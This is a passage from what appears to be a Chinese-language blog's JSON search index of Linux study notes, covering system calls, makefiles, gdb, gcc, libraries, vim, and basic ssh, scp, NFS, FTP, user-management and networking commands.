count);fd：文件描述符；buf：指定的缓冲区，即指针，指向一段内存单元；nbyte：要写入文件指定的字节数；返回值：写入文档的字节数（成功）；-1（出错）write函数把buf中nbyte写入文件描述符handle所指的文档，成功时返回写的字节数，错误时返回-1.","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"open函数","slug":"linux046open函数","date":"2022-01-08T13:23:33.000Z","updated":"2022-02-15T18:06:56.982Z","comments":true,"path":"2022/01/08/linux046open函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux046open函数/","excerpt":"","text":"12345头文件：#include&lt;fcntl.h&gt;//在centos6.0中只要此头文件就可以 #include&lt;sys/types.h&gt; #include&lt;sys/stat.h&gt;功能：打开和创建文件（建立一个文件描述符，其他的函数可以通过文 件描述符对指定文件进行读取与写入的操作。） 1234567891011121314151617181920212223242526int open(const char*pathname,int flags);int open(const char*pathname,int flags,mode_t mode);参数说明：1.pathname 要打开或创建的目标文件2.flags 打开文件时，可以传入多个参数选项，用下面的 一个或者多个常量进行“或”运算，构成falgs 参数： O_RDONLY: 只读打开 O_WRONLY: 只写打开 O_RDWR: 读，写打开这三个常量，必须制定一个且只能指定一个 O_CREAT: 若文件不存在，则创建它，需要使 用mode选项。来指明新文件的访问权限 O_APPEND: 追加写，如果文件已经有内容，这次打开文件所 写的数据附加到文件的末尾而不覆盖原来的内容 O_EXCL如果要创建的文件已存在，则返回-1，并且修改errno的值 O_TRUNC如果文件存在，并且以只写/读写方式打开，则清空文件全部内容(即将其长度截短为0) O_NONBLOCK：如果打开的文件是一个管道、一个块设备文件或一个字符设备文件，则后续的I/O操作均设置为非阻塞方式 O_SYNC：使每次write都等到物理I/O操作完成，包括由该write操作引起的文件属性更新所需的I/O。判断文件是否存在 O_CREAT | O_EXCL 必须同时使用 ps：open函数具体使用那个，和具体应用场景相关，如目标文件存在，使用两个参数的open，如果目标文件不存在，需要open创建，则第三个参数表示创建文件的默认权限 创建文件时 :本地有一个掩码,可以用umake命令查询 文件实际权限=文件掩码取反 &amp; 文件权限 123456789例如创建一个文件的权限是777,文件掩码是002111 111 111 777000 000 010 002111 111 101 &amp;111 111 111 777按位取反得来111 111 101 &amp; 111 111 111 = 111 111 101 实际权限是775 返回值 123成功：新打开的文件描述符失败：-1open返回的文件描述符一定是最小的而且没有被使用的 close 1234567891011头文件：#include&lt;unistd.h&gt;功能：关闭一个已经打开的文件int close(int fd)参数说明： fd：是需要关闭的文件描述符 成功：返回0；失败：返回-1，并设置errno 打开的文件描述符一定要记得关闭，否则资源会被大量的占用，导致内存不够 open函数中的erron全局变量 错误宏定义位置 12345第1-34个错误定义/usr/include/asm-generic/errno-base.h第35-133个错误定义/usr/include/asm-generic/errno.h 是记录系统的最后一次错误代码. 代码是一个int型的值 使用perror读错误的信息 123456头文件stdio.hvoid perror(const char *s)用来将上一个函数发生错误的原因输出到标准设备(stderr)参数s所指的字符串会先打印出,后面再加上错误原因字符串此错误原因依照全局变量errno的值来决定要输出的字符串","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"C库函数与系统函数的关系","slug":"linux045C库函数与系统函数的关系","date":"2022-01-08T10:52:02.000Z","updated":"2022-01-08T12:58:43.141Z","comments":true,"path":"2022/01/08/linux045C库函数与系统函数的关系/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux045C库函数与系统函数的关系/","excerpt":"","text":"printf是如何显示消息的 首先printf函数有一个stdout指针 stdout是FILE*指针 priintf会调用系统应用层wirte函数,然后wirte函数会从用户空间转换为内核空间，然后调用sys_wirte()函数(系统调用)，接着sys_write()会调用内核层的设备驱动函数,通过设备驱动操作硬件显示字符串","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"虚拟地址空间","slug":"linux044虚拟地址空间","date":"2022-01-08T09:47:38.000Z","updated":"2022-01-08T10:46:57.431Z","comments":true,"path":"2022/01/08/linux044虚拟地址空间/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux044虚拟地址空间/","excerpt":"","text":"Linux会为每一个进程分配4GB的虚拟地址空间 3G-4GB的内核空间中有一个PCB进程控制块,进程控制块有一个文件描述符表，它是一个长度为1024的整型数组，第0-2个位置存放了标准输入，标准输出，标准错误，默认总是打开状态 Linux中的一个进程最多可以打开1024-3个文件 每打开一个文件，就会占用一个文件描述符，而且使用的是空闲的最小的一个文件描述符 例如A进程打开了文件file1，存放在3号位置，再打开一个file2，存放在4号位置，此时关闭file1，在打开一个file3，则会存放在3号位置 0到3GB的内存是用户内存空间 0~4k是不能使用的受保护内存 ELF格式: .text 是代码段 其他段:只读数据段和符号段等 .data:是已初始化的全局变量,初始化之后是不等于0的 .bss是未初始化全局变量,等于0 堆空间 堆空间是向上分配内存的 共享库 调用的时候加载到这里 栈空间 向下分配内存 命令行参数 1int main(int argc,char* argv[]) 存放main函数参数的值 环境变量 系统中环境变量存放到这里 内核空间 内存管理 进程管理 设备驱动管理 VFS虚拟文件系统 内核空间是受保护的,用户不能对该空间进行读写操作,否则会出现段错误 CPU为什么要使用虚拟地址空间与物理地址空间映射? 1.方便编译器和操作系统安排程序的地址分布 程序可以使用一系列相邻的虚拟地址来访问物理内存中不相邻的大内存缓冲区 2.方便进程之间隔离 不同进程使用的虚拟地址彼此隔离,一个进程中的代码无法更改正在由另一进程使用的物理内存 3.方便OS使用内存 程序可以使用一系列虚拟地址来访问大于可用物理内存的内存缓冲区.当物理内存的供应量变小时，内存管理器会将物理内存页（通常大小为4KB）保存到磁盘文件。数据或代码页会根据需要在物理内存与磁盘之间移动。 虚拟内存只有使用的时候 ,内存才会变少,并不是程序一运行起来就少4个G的空间","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"C库函数","slug":"linux043C库函数","date":"2022-01-08T09:19:07.000Z","updated":"2022-01-08T09:22:17.058Z","comments":true,"path":"2022/01/08/linux043C库函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux043C库函数/","excerpt":"","text":"FILE是一个结构的,有三个成员, 第一个是文件描述符(整型)用来保存索引 第二个是文件读写指针位置 第三个是I/O缓冲区,默认缓冲区大写是8KB","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"makefile","slug":"linux042makefile","date":"2022-01-08T05:37:34.000Z","updated":"2022-01-08T09:00:45.660Z","comments":true,"path":"2022/01/08/linux042makefile/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux042makefile/","excerpt":"","text":"项目代码管理工具 1).命名规则 Makefile或makefile 2).makefile的规则: 规则中有三要素:目标,依赖,命令 12make make命令运行makefile 123456目标:依赖 命令 //命令左边一定要有一个tab缩进app:main.c add.c sub.c mul.c gcc main.c add.c sub.c mul.c -o app 12345678main:main.o add.o gcc main.o add.o -o mainmain.o:main.c gcc -c main.cadd.o:add.c gcc -c add.c 当add.c的修改时间 大于add.o的修改时间时,表示文件过时了 终极目标一定要在最前面 makefile中的变量 12变量名=值$(变量名) 代表取变量的值 1234567obj=main.o add.otarget=main$(target):$(obj) gcc $(obj) -o $(target)%.o:%.c gcc -c $&lt; -o $@ 1%.o:%.c代表自动匹配,当main.o找不到的时候,会自动匹配%.o:%.c,然后变成main.o:main.c makefile中的自动变量 1234$&lt; 规则中的第一个依赖$@ 规则中的目标$^ 规则中的所有依赖只能在规则的命令中使用 由Makefile维护的一些变量 12345通常都是大写CC:默认值ccCPPFLAGS:预处理器需要的选项 -ICFLAGS:编译的时候使用的参数 -Wall -g -cLDFLAGS: 链接库使用的选项 -L -l 123456789obj=main.o add.otarget=mainCC=gcc$(target):$(obj) $(CC) $(obj) -o $(target)%.o:%.c $(CC) -c $&lt; -o $@ makefile中的函数 所有的函数都有返回值 wildcard函数 取目录所有参数指定的文件 1234$(wildcard 参数)$代表取函数值src=$(wildcard ./*.c)获取当前目录的所有.c文件 patsubst函数 替换函数 123$(patsubst 被替换的字符串, 要替换的字符串,源字符串)obj=$(patsubst ./%.c, ./%.o,$(src))将变量src中所有.c字符串替换成.o字符串 12345678910111213 1 #obj=main.o add.o 2 src=$(wildcard ./*.c) 3 obj=$(patsubst ./%.c, ./%.o,$(src)) 4 5 target=main 6 CC=gcc 7 CFLAGS=-g 8 $(target):$(obj) 9 $(CC) $(obj) -o $(target) $(CFLAGS)10 11 %.o:%.c12 $(CC) -c $&lt; -o $@13 12345clean: rm $(obj) $(target)删除所有变量obj和target文件 使用 make clean 伪目标 1.PHONY:目标名 不进行更新操作. 例如当前目录下有一个clean文件,当执行make clean之后会显示当前已是最新,加上伪目标之后会忽略更新，直接运行 123.PHONY:cleanclean: rm $(obj) $(target) 忽略命令错误 在命令前面加上-表示如果当前命令出错了，自动忽略错误，继续执行下一条命令 12clean: -rm $(obj) $(target)","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"gdb调试","slug":"linux041gdb调试","date":"2022-01-08T05:36:16.000Z","updated":"2022-01-08T05:37:06.554Z","comments":true,"path":"2022/01/08/linux041gdb调试/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux041gdb调试/","excerpt":"","text":"可执行程序必须包含调试信息-g 12gdb 程序名gdb main 123456789l 输出十行源代码l 文件名:要查看第几行l main.c 10l 文件名:函数名l main.c main后面继续按回车可以继续显示源代码,直到输入了其他命令 设置断点 1234567b 行号/函数名break 行号/函数名break 22b 37b mainbreak main 条件断点 12b 行号 if 条件b 15 if i==15 //当i等于15时,设置15行断点 查看断点信息 12345678i b或info breakNum Type Disp Enb Address What1 breakpoint keep y 0x00000000000006cf in main at main.c:6enb y表示断点开始,n表示断点关闭main.c:6 代表在main.c文件的第六行断点 删除断点 1234需要通过 info break 找到断点编号d 编号d 4 1start 执行一步 单步调试 1n 继续执行 12c 代表执行到断点的位置 进入函数内部 1s 查看变量的值 12p 变量名p i 查看变量的类型 12ptype 变量名ptype i 追踪变量的值 12345678display 变量名display i取消追踪变量undisplay 追踪变量的编号undisplay 1查看追踪变量的编号info display 跳出当次循环 1u 跳出当前函数 1finish 循环有断点需要先删除断点 设置变量的值 12set var 变量名=值set var i=10 退出gdb 1quit","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"共享库(动态库)","slug":"linux040共享库和动态库","date":"2022-01-08T05:22:01.000Z","updated":"2022-01-08T05:28:51.897Z","comments":true,"path":"2022/01/08/linux040共享库和动态库/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux040共享库和动态库/","excerpt":"","text":"共享库的制作： 命名规则： 1lib+名字+.so ​ 制作步骤： 1).生成与位置无关的代码（生成与位置无关的.o） 1gcc -fPIC -c *.c 2).将.o打包成共享库(动态库) 1gcc -shared -o libMylib.so *.o 共享库是程序运行的时候才加载的 ​ 发布和使用共享库(动态库) 1)头文件 2)库文件 使用： 12gcc main.c 库的目录和名字 -o maingcc main.c ./libMylib.so -o main ​ 解决程序执行时动态库无法被加载的问题 1）将库文件放到/lib目录里(不建议使用) ​ 2）临时设置终端环境变量 ​ 环境变量:LD_LIBRARY_PATH=将动态库的路径设置给该变量 ​ 将设置的值,导入到环境变量中: 12export LD_LIBRARY_PATH=目录export LD_LIBRARY_PATH=./lib 终端关闭失效 3).设置家目录.bashrc配置文件 ​ 在.bashrc文件最后一行添加 1export LD_LIBRARY_PATH=目录(绝对路径) ​ 每次启动bash时都会自动执行这条命令 ​ 终端重启生效 ​ 4).配置ld.so.conf文件 ​ 1.需要找动态链接器的配置文件 ​ 1/etc/ld.so.conf ​ 2.动态库的路径写到配置文件 ​ 3.更新 1sudo ldconfig -v 动态库的优缺点: 优点: ​ 1)执行程序体积小 ​ 2)动态库更新了,不需要重新编译程序,前提是函数接口不变 ​ 缺点: ​ 发布程序的时候，需要将动态库提供给用户 ​ 动态库没有被打包到应用程序中，加载速度相对较慢","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"静态库的制作和使用","slug":"linux039静态库的制作和使用","date":"2022-01-08T05:17:08.000Z","updated":"2022-01-08T05:21:07.770Z","comments":true,"path":"2022/01/08/linux039静态库的制作和使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux039静态库的制作和使用/","excerpt":"","text":"命名规则： 12lib + 库的名字 +.a例如：libMylib.a 制作步骤： 1).生成对应的.o文件 1gcc *.c -c ​ 2).将生成的.o文件打包 12ar rcs 静态库的名字 生成的所有.o文件ar rcs libMylib.a *.o 发布和使用静态库 ​ 1)发布静态库 ​ 2)头文件 使用: 12345gcc main.c 库的目录和名字 -o maingcc main.c ./libMylib.a -o maingcc main.c -L 库的目录 -l 库的名字(将lib和.a去掉) -o maingcc main.c -L lib -l Mylib -o main 静态库的优缺点： 优点： ​ 发布程序的时候不需要提供对应的库 ​ 加载库的速度快 ​ 缺点； ​ 库被打包到应用程序中，导致库的体积很大 ​ 库发生改变，需要重新编译程序 ​ 链接器是以.o为单位链接的 nm 1nm 库的名字/可执行程序 可以查看库的一些信息 T 代表在代码区","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"编译过程","slug":"linux038编译过程","date":"2022-01-08T05:14:49.000Z","updated":"2022-01-08T05:16:29.134Z","comments":true,"path":"2022/01/08/linux038编译过程/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux038编译过程/","excerpt":"","text":"12345源文件----&gt;预处理---&gt;编译---&gt;汇编----&gt;链接----&gt;可执行文件预处理器(.i)---&gt;编译器(.s)----&gt;汇编器(.o)----&gt;链接器hello.c---&gt;hello.i-----&gt;hello.s-----hello.o----a.out ​ 预处理器(cpp):头文件展开,宏替换,注释去掉 1gcc -E hello.c -o hello.i 编译器(gcc):c文件编程汇编文件 1gcc -S hello.i -o hello.s 汇编器(as):汇编文件变成二进制文件 1gcc -c hello.s -o hello.o 链接器(ld):将函数库中相应的代码组合到目标文件中 1gcc hello.o -o hello 直接生成可执行文件： 12gcc hello.c -o myappgcc hello.c //生成一个默认的可执行文件 a.out 指定头文件目录 12gcc hello.c -I ./include -o appgcc hello.c -I./include -o app 旧版本的gcc -I后面不可以有空格 ​ ./include就是头文件的目录 123#ifdef DEBUGprintf(&quot;123&quot;)#endif 通过gcc定义一个DEBUG宏 1gcc hello.c -o app -D DEBUG 优化程序(-O大写) ​ 优化等级 0~3，0不优化 1gcc hello.c -o app —O3 输出警告信息（-Wall） 1gcc hello.c -o app -Wall 添加调试信息（-g） 1gcc hello.c -o app -g","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"vi操作","slug":"linux037vi操作","date":"2022-01-08T05:06:30.000Z","updated":"2022-01-23T18:37:06.436Z","comments":true,"path":"2022/01/08/linux037vi操作/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux037vi操作/","excerpt":"","text":"vim是从vi发展过来的一款文本编辑器 1vi a.txt 前提安装了vim软件 工作模式： ​ 命令模式：-- 打开文件之后，默认就是命令模式（ESC键） ​ 编辑模式：–需要输入一些命令，切换到编辑模式(iaos，IAOS)，按esc键回到命令模式 ​ 末行模式：-- 在末行模式可以输入一些命令（ : 键 ） 按两次esc键切回命令模式 编辑模式不能直接切回到末行模式，需要先切换到命令模式，然后再切回到末行模式 命令模式下的操作： 光标移动： ​ 12345678H J K L前 下 上 后行首：0行尾：$文件开始位置：gg文件末尾：G行跳转：300gg 删除操作： 1234567删除光标后边的字符：x删除光标前的字符：X删除单词：dw（光标移动到单词开始位置，否则只能删除一部分）删除光标到行首的字符串：d0删除光标到行尾字符串：D（d$）删除光标当前行：dd删除光标多行：ndd（n--自然数） 撤销操作： 12撤销：u反撤销：ctrl+r ​ 复制粘贴: 1234567891011复制：yy复制多行：nyy粘贴：p（光标所在行的下一行）粘贴：P（大写，光标所在行） 在vim中剪切等于删除剪切：dd（剪切一行）剪切多行：ndd（n--自然数） 可视模式： ​ 1234567切换到可视模式：v选择内容：h j k l复制：y 删除当前行：d粘贴：小写p（粘贴到光标下一个字符）或大写P（粘贴到光标上一个字符） ​ 查找和替换操作： 12345/查找内容 往下找？查找内容 往上找把光标移动到查找的单词上，按#遍历快捷键：n或N，往下找n是下一个，N是是一个，往上找n是上一个，N是下一个，取决于查找方向 1r：替换当前字符 按下r之后输入一个字符，只能替换一个字符 缩进： 12向右：&gt;&gt;向左：&lt;&lt; 查看帮助文档，首先光标移动到关键字或函数那里，然后按下数字，例如3，在按shitf+k 文本模式下的操作： ​ 切换到文本模式： 1234567891011a -- 在光标所在位置的后边插入A -- 在当前行的尾部插入i -- 在光标所在位置的前边插入I -- 在光标所在行的行首插入o -- 在光标所在行的下边开辟一个新的行O -- 在光标所在行的上边开辟一个新的行s -- 删除光标后边的字符，然后插入S -- 删除光标所在行，然后插入 末行模式下的操作： 输入linux命令 1:!命令 替换： 先查找,然后光标移动到要替换的行 123456:s/tom/jack 代表用jack替换当前行的第一个toms/tom/jack/g 代表用jack替换当前行的所有tom:%s/tom/jack 代表用jack替换当前文本所有行的第一个tom:%s/tom/jack/g 代表用jack替换当前文本的所有tom:20,25s/tom/jack/g 代表用jack替换20行到25行的tom:20,25s/tom/jack/ 代表用jack替换20行到25行的第一个tom 保存退出: 12345:q 退出:q! 退出不保存:w 保存:wq 保存退出:x 保存退出 命令模式下的保存退出 1ZZ 命令模式分屏操作: 123456789:sp 将屏幕分成两部分 水平：vsp 将屏幕分成两部分 垂直:sp或vsp +文件名,水平或垂直拆分窗口显示两个不同的文件:wqall保存并退出所有屏幕:wall 保存所有:wq保存并退出光标所在的屏幕:q 退出当前屏幕ctrl+ww 切换屏幕 vim打造IDE 系统级配置文件目录:/etc/vim/vimrc 用户级配置文件目录:~/.vim/vimrc ~/.vimrc 123456789101112set numberset ts=4set softtabstop=4set shiftwidth=4set expandtabset autoindentinoremap ( ()&lt;ESC&gt;hainoremap &#123; &#123;&#125;&lt;ESC&gt;hainoremap [ []&lt;ESC&gt;hainoremap &apos; &apos;&apos;&lt;ESC&gt;hainoremap &quot; &quot;&quot;&lt;ESC&gt;haimap &#123; &#123;&lt;CR&gt;&#125;&lt;ESC&gt;O ts 是tabstop的缩写，设TAB宽度为4个空格。 softtabstop 表示在编辑模式的时候按退格键的时候退回缩进的长度，当使用 expandtab 时特别有用。 shiftwidth 表示每一级缩进的长度，一般设置成跟 softtabstop 一样。 expandtab表示缩进用空格来表示，noexpandtab 则是用制表符表示一个缩进。 autoindent自动缩进","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"电源命令","slug":"linux036电源命令","date":"2022-01-08T05:04:41.000Z","updated":"2022-01-08T05:05:49.992Z","comments":true,"path":"2022/01/08/linux036电源命令/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux036电源命令/","excerpt":"","text":"poweroff 关机 1poweroff reboot 重启 1reboot shutdown 123456789-a 指定权限-r 重启计算器（和reboot）命令一样-k 模拟关机（只向用户发出警告信息，但不关机）-h 关闭计算机并关闭电源（常用）-n 不调用init进程关闭计算机（不推荐）-c 取消正在执行的关机命令-f 重启计算机，但不进行磁盘检测-F 重启计算机，进行磁盘检测-t(秒) 指定发出警告信息与删除信息时要延迟的秒数 12345shutdown -r now //加now则是立即重启shutdown -h +1 &quot;1 minute after shutdown&quot; //设置1分钟以后关闭计算机，并在SSH中提示“1 minute after shutdown”shutdown -c //取消关机shutdown now //切换至单人操作模式","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"echo命令","slug":"linux035echo命令","date":"2022-01-08T05:02:56.000Z","updated":"2022-01-08T05:04:05.279Z","comments":true,"path":"2022/01/08/linux035echo命令/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux035echo命令/","excerpt":"","text":"在显示器上显示数据 普通数据:echo 字符串 显示环境变量: 12echo $变量名echo $PATH 显示上一次程序退出值: 1echo $? $代表取值","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"设置或查看命令别名","slug":"linux034设置或查看命令别名","date":"2022-01-08T05:01:14.000Z","updated":"2022-01-08T05:02:32.003Z","comments":true,"path":"2022/01/08/linux034设置或查看命令别名/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux034设置或查看命令别名/","excerpt":"","text":"查看 12alias 命令名alias ls 设置 12alias 新命令名=&apos;命令操作&apos;alias pag=&apos;ps aux | grep&apos; ​ 需要长久有效需要去设置配置文件：~/.bashrc","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"看手册","slug":"linux033看手册","date":"2022-01-08T04:59:33.000Z","updated":"2022-01-08T05:00:32.368Z","comments":true,"path":"2022/01/08/linux033看手册/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux033看手册/","excerpt":"","text":"man [编号] 命令名 12345678910 编号：1 普通用户可以执行的系统命令和可执行文件的帮助2 内核可以调用的函数和工具的帮助3 C语言函数的帮助4 设备和特殊文件的帮助5 配置文件的帮助6 游戏的帮助（个人版的Linux中是有游戏的）7 杂项的帮助8 超级用户可以执行的系统命令的帮助9 内核的帮助","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"scp命令","slug":"linux032scp命令","date":"2022-01-08T04:57:43.000Z","updated":"2022-01-08T04:58:28.368Z","comments":true,"path":"2022/01/08/linux032scp命令/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux032scp命令/","excerpt":"","text":"超级复制 ​ 使用该命令的前提条件是目标主机已经成功安装openssh-server ​ 使用格式： ​ 1scp -r 目标用户名@目标主机ip地址:/目标文件的绝对路径 /保存到本机的绝对（相对）路径 ​ 拷贝目录要加-r，拷贝文件不需要加-r ​ 1scp -r yxc19980620c@192.168.44.135:/home/yxc19980620c/test2 ./test3","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"ssh远程登录到服务器","slug":"linux031ssh远程登录到服务器","date":"2022-01-07T17:02:21.000Z","updated":"2022-01-07T17:05:20.871Z","comments":true,"path":"2022/01/08/linux031ssh远程登录到服务器/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux031ssh远程登录到服务器/","excerpt":"","text":"安装： 1sudo apt-get install openssh-server 查看是否安装ssh 1sudo aptitude show openssh-server 配置文件：/etc/ssh/ssh_config 远程登录： 123ssh 用户名@ip输入yes或no输入密码 退出登录： 1logout","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"nfs服务器","slug":"linux030nfs服务器","date":"2022-01-07T16:56:00.000Z","updated":"2022-01-07T17:00:07.964Z","comments":true,"path":"2022/01/08/linux030nfs服务器/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux030nfs服务器/","excerpt":"","text":"安装 1sudo apt-get install nfs-kernel-server 功能： 创建一个共享目录 ​ 1).先创建一个目录 1mkdir 目录名 2).修改配置文件 /etc/exports 添加这一行 /home/用户名/共享目录 *（访问权限，sync） 123456789/home/qwe/aa *（rw，sync）*代表ip地址 访问权限有ro（只读），rw（可读可写），sync（代表实时更新）ro 只读rw 读写root_squash 当NFS客户端以root管理员访问时，映射为NFS服务器的匿名用户no_root_squash 当NFS客户端以root管理员访问时，映射为NFS服务器的root管理员all_squash 无论NFS客户端使用什么账户访问，均映射为NFS服务器的匿名用户sync 同时将数据写入到内存与硬盘中，保证不丢失数据async 优先将数据保存到内存，然后再写入硬盘；这样效率更高，但可能会丢失数据 重启服务 1sudo service nfs-kernel-server restart 客户端： ​ 挂载服务器共享目录 mount 服务器ip:共享目录 /mnt 1mount 192.168.1.123:/home/xiaoh/nfs /mnt","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"lftp客户端","slug":"linux029lftp客户端","date":"2022-01-07T16:46:51.000Z","updated":"2022-01-07T16:53:32.392Z","comments":true,"path":"2022/01/08/linux029lftp客户端/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux029lftp客户端/","excerpt":"","text":"下载 1sudo apt-get install lftp ​ 登录服务器: 匿名: 12lftp 服务器ip输入login ​ 实名: 12lftp 用户名@ip地址 输入服务器密码 操作 获取本地当前目录地址 1lpwd 获取服务器当前目录地址 1pwd 切换本地目录 12lcd 目录lcd aaa 切换服务器目录 1cd 目录 上传文件 1put 文件名 上传多个文件 1mput 文件1 文件2 文件3 下载文件 1get 文件名 下载多个文件 1mget 文件1 文件2 文件3 下载整个目录及其子目录 1mirror 目录名 上传整个目录及其子目录 1mirror -R 目录名","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"ftp服务器配置","slug":"linux028ftp服务器配置","date":"2022-01-07T16:40:15.000Z","updated":"2022-01-07T16:46:13.297Z","comments":true,"path":"2022/01/08/linux028ftp服务器配置/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux028ftp服务器配置/","excerpt":"","text":"ftp服务器名:vsftpd 作用:文件上传和下载 ftp服务器配置 ​ 配置文件在/etc/vsftpd.conf 12345678910111213anonymous_enable=YES 允许匿名用户登录write_enable=YES 实名登录用户拥有写的权限local_umask=022 设置本地掩码为022anon_mkdir_write_enable=YES 匿名用户可以在ftp服务器上创建目录listen_ipv6=NOlisten=YES 重启ftp服务 1sudo service vsftpd restart ftp服务 1234567sudo service vsftpd start 启动ftpsudo service vsftpd stop关闭ftp服务sudo service vsftpd restart重启ftp服务。service vsftpd status查看状态 实名登录ftp 123ftp ip地址 输入用户 输入密码 ​ 退出 123bye quitexit 文件上传和下载 上传 在什么目录登录的,文件默认从那里找 put 文件名 1put aaa 下载 get 文件名 1get aaa 不允许操作目录,可以打包处理 匿名登录服务器 用户名是anonymous 密码是空 不允许匿名用户在任意目录直接切换 只能在一个指定的目录范围内工作 需要在ftp服务器上创建一个匿名用户的目录 --匿名用户的根目录 配置文件在/etc/vsftpd.conf 在配置文件添加 anon_root=/home/yxc19980620c/myFtp/ 匿名登录默认路径是在/srv/ftp 在配置文件/etc/passwd可以查看并修改 1ftp:x :123:127:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"用户管理","slug":"linux027用户管理","date":"2022-01-07T16:29:32.000Z","updated":"2022-01-07T16:38:39.916Z","comments":true,"path":"2022/01/08/linux027用户管理/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux027用户管理/","excerpt":"","text":"创建用户 adduser adduser 用户名 创建一个用户 ​ 需要管理员权限 ​ 用户名不能有大写字母 1sudo adduser abc useradd ​ 创建一个用户 ​ 用户名可以大写 ​ 需要管理员权限 1useradd -s /bin/bash -g xiaoai -d /home/xiaoai -m xiaoai ​ -s 表示使用什么命令解析器 ​ -g 用户组 ​ -d 用户家目录 ​ -m 如果用户家目录不存在,则创建一个目录 添加用户组 groupadd ​ 添加一个用户组 ​ 需要管理员权限 ​ groupadd 用户组名 1groupadd abc ​ 修改用户密码 passwd ​ 修改用户密码 ​ 需要管理员权限 passwd 用户名 12345passwd rootpasswd //修改当前用户密码sudo passwd //修改root用户密码 ​ passwd 不加sudo 不输入用户名表示修改当前用户密码 ​ sudo passwd 表示修改root用户密码 删除用户 deluser ​ 删除用户 ​ deluser 用户名 1deluser aaa ​ 需要手动删除家目录 userdel ​ 删除用户 ​ userdel -r 用户名 1userdel -r abc ​ 不需要手动删除家目录 查看当前系统下有哪些用户 12vim /etc/passwdyxc19980620c:x:1000:0:yc:/home/yxc19980620c:/bin/bash ​ /bin/bash 代表使用什么命令解析器 切换用户 su命令 su 用户名 1su root 退出当前用户 1exit ​","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"nslookup把域名转换为ip","slug":"linux026nslookup把域名转换为ip","date":"2022-01-07T16:27:27.000Z","updated":"2022-01-07T16:29:02.179Z","comments":true,"path":"2022/01/08/linux026nslookup把域名转换为ip/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux026nslookup把域名转换为ip/","excerpt":"","text":"nslookup把域名转换为ip nslookup 域名 1nslookup www.baidu.com 1234567root@yc:/home/yxc19980620c/my# nslookup www.baudu.comServer: 127.0.0.53Address: 127.0.0.53#53Non-authoritative answer:Name: www.baudu.comAddress: 47.91.20.194","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"ping命令","slug":"linux025ping命令","date":"2022-01-07T16:21:39.000Z","updated":"2022-01-07T16:27:02.986Z","comments":true,"path":"2022/01/08/linux025ping命令/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux025ping命令/","excerpt":"","text":"ping 命令 检查网络是否通 ping ip地址 1ping 192.168.1.123 ping ip地址 -c 次数 1ping 192.168.1.123 -c 5 //ping多少次 ping ip地址 -i 秒数 1ping 192.168.1.123 -i 5 //每隔5秒返回一次结果 ping 域名 1ping 